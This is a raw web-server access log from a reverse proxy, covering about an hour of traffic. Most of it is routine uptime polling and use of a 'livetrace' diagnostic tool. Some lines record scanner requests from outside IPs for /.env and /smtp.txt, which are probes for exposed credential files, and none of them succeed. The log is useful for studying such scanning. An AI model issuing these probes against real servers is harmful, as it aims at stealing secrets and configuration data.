173.48.140.140 - - [19/Dec/2023:01:39:39 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 493 "-" "-" 7306 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:40 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 744 "-" "-" 7307 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:40 +0000] "GET /trace/cleantrace.php?id=g0mchk411 HTTP/2.0" 200 72 "-" "-" 7308 "livetrace@docker" "http://172.18.0.3:80" 2ms
45.79.181.179 - - [19/Dec/2023:01:39:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7309 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7310 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7311 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7312 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7313 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7314 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7315 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7316 "www@docker" "http://172.18.0.9:80" 1ms
192.241.219.37 - - [19/Dec/2023:01:43:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7317 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7318 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.252 - - [19/Dec/2023:01:43:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7319 "-" "-" 0ms
91.92.243.232 - - [19/Dec/2023:01:43:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7320 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7321 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7322 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7323 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7324 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7325 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7326 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7327 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7328 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7329 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7330 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7331 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7332 "www@docker" "http://172.18.0.9:80" 0ms
35.190.199.12 - - [19/Dec/2023:01:49:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7333 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7334 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7335 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7336 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7337 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7338 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [19/Dec/2023:01:52:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7339 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7340 "www@docker" "http://172.18.0.9:80" 1ms
192.155.90.220 - - [19/Dec/2023:01:53:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7341 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7342 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7343 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7344 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [19/Dec/2023:01:54:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7345 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:01:54:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7346 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7347 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7348 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7349 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7350 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:01:56:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7351 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7352 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7353 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7354 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7355 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7356 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7357 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7358 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7359 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7360 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7361 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7362 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7363 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7364 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7365 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7366 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7367 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7368 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7369 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7370 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7371 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7372 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7373 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7374 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7375 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7376 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7377 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7378 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7379 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7380 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7381 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7382 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:11:39 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 7383 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:02:11:39 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 200 1367 "-" "-" 7384 "livetrace@docker" "http://172.18.0.3:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7385 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7386 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:02:12:42 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7387 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:02:12:42 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7388 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7389 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.167 - - [19/Dec/2023:02:13:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7390 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:02:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7391 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7392 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7393 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7394 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7395 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7396 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:02:16:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7397 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:02:16:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7398 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:02:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7399 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7400 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7401 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7402 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7403 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7404 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7405 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7406 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7407 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7408 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7409 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7410 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7411 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7412 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7413 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7414 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7415 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:02:24:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7416 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7417 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7418 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7419 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7420 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7421 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7422 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7423 "www@docker" "http://172.18.0.9:80" 1ms
87.236.176.7 - - [19/Dec/2023:02:28:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7424 "web-to-websecure@internal" "-" 0ms
87.236.176.7 - - [19/Dec/2023:02:28:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7425 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:02:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7426 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7427 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7428 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7429 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7430 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7431 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7432 "www@docker" "http://172.18.0.9:80" 0ms
23.90.165.38 - - [19/Dec/2023:02:32:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7433 "web-to-websecure@internal" "-" 0ms
23.90.165.38 - - [19/Dec/2023:02:32:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7434 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7435 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7436 "www@docker" "http://172.18.0.9:80" 1ms
2.56.247.167 - - [19/Dec/2023:02:32:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7437 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7438 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7439 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7440 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7441 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [19/Dec/2023:02:34:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7442 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7443 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7444 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7445 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7446 "www@docker" "http://172.18.0.9:80" 1ms
31.172.80.202 - - [19/Dec/2023:02:36:39 +0000] "GET /smtp.txt HTTP/1.1" 404 19 "-" "-" 7447 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7448 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7449 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7450 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7451 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:02:38:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7452 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:02:38:49 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7453 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7454 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7455 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7456 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7457 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7458 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7459 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7460 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7461 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7462 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7463 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7464 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7465 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7466 "www@docker" "http://172.18.0.9:80" 0ms
31.172.80.202 - - [19/Dec/2023:02:45:29 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 7467 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:02:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7468 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7469 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7470 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7471 "www@docker" "http://172.18.0.9:80" 3ms
167.71.120.76 - - [19/Dec/2023:02:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7472 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:02:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7473 "www@docker" "http://172.18.0.9:80" 35ms
173.48.140.140 - - [19/Dec/2023:02:48:30 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 7474 "livetrace@docker" "http://172.18.0.3:80" 26ms
173.48.140.140 - - [19/Dec/2023:02:48:30 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 200 1424 "-" "-" 7475 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:33 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 7476 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:02:48:34 +0000] "GET /trace/startping.php?id=fmo2yglzi HTTP/2.0" 200 105 "-" "-" 7477 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:02:48:34 +0000] "GET /trace/starttrace.php?id=7tw9a0mry HTTP/2.0" 200 106 "-" "-" 7478 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:02:48:35 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 32 "-" "-" 7479 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:02:48:35 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 261 "-" "-" 7480 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7481 "www@docker" "http://172.18.0.9:80" 18ms
173.48.140.140 - - [19/Dec/2023:02:48:36 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 56 "-" "-" 7482 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:36 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 261 "-" "-" 7483 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:37 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 261 "-" "-" 7485 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:37 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 81 "-" "-" 7484 "livetrace@docker" "http://172.18.0.3:80" 2ms
